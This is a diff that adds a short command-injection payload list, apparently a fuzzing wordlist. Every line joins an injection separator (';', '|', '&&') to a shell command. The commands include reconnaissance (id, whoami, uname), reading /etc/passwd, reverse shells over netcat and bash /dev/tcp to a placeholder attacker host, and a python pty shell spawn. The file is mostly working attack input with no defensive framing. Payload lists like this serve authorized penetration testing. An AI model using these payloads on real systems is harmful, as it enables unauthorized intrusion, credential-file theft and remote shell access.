@@ -1,0 +1,26 @@
+; ls
+| ls
+&& ls
+| id
+&& id
+; id
+| whoami
+&& whoami
+; uname -a
+| uname -a
+&& uname -a
+; pwd
+| pwd
+&& pwd
+; cat /etc/passwd
+| cat /etc/passwd
+&& cat /etc/passwd
+; nc -e /bin/sh attacker_ip attacker_port
+| nc -e /bin/sh attacker_ip attacker_port
+&& nc -e /bin/sh attacker_ip attacker_port
+; bash -i >& /dev/tcp/attacker_ip/attacker_port 0>&1
+| bash -i >& /dev/tcp/attacker_ip/attacker_port 0>&1
+&& bash -i >& /dev/tcp/attacker_ip/attacker_port 0>&1
+; python -c 'import pty; pty.spawn("/bin/sh")'
+| python -c 'import pty; pty.spawn("/bin/sh")'
+&& python -c 'import pty; pty.spawn("/bin/sh")'
